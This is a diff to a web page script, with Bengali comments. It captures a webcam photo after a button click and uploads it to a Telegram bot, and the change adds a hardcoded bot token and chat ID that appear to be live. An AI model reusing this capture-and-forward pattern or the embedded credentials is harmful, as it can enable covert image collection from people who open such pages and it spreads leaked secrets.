@@ -30,6 +30,9 @@
 
     <script>
         document.getElementById('captureBtn').addEventListener('click', function() {
+            let botToken = "7847518909:AAF_5IKKK7gyDT_YHvDMjenA-j0roWTktgw";  // এখানে আপনার টেলিগ্রাম বটের টোকেন দিন
+            let chatId = "6947565760";  // এখানে আপনার চ্যাট আইডি দিন
+
             // ক্যামেরা অ্যাক্সেস চাওয়া
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
@@ -51,21 +54,27 @@
                         // ছবিকে Blob এ কনভার্ট করা
                         canvas.toBlob(blob => {
                             let formData = new FormData();
-                            formData.append("chat_id", "7173469811:AAHCdif3_86tiiwLqstaj2R4Sfq4jiyB7-o");
+                            formData.append("chat_id", chatId);
                             formData.append("photo", blob, "image.jpg");
 
                             // টেলিগ্রাম বটে ছবি পাঠানো
-                            fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendPhoto`, {
+                            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                                 method: "POST",
                                 body: formData
                             })
                             .then(response => response.json())
-                            .then(data => alert("ছবি সফলভাবে পাঠানো হয়েছে!"))
-                            .catch(error => alert("ছবি পাঠাতে সমস্যা হয়েছে!"));
+                            .then(data => {
+                                if (data.ok) {
+                                    alert("✅ ছবি সফলভাবে পাঠানো হয়েছে!");
+                                } else {
+                                    alert("❌ ছবি পাঠাতে সমস্যা হয়েছে!");
+                                }
+                            })
+                            .catch(error => alert("❌ ত্রুটি: " + error));
                         }, 'image/jpeg');
                     }, 3000);
                 })
-                .catch(error => alert("ক্যামেরা অ্যাক্সেস পাওয়া যায়নি!"));
+                .catch(error => alert("❌ ক্যামেরা অ্যাক্সেস পাওয়া যায়নি!"));
         });
     </script>
 
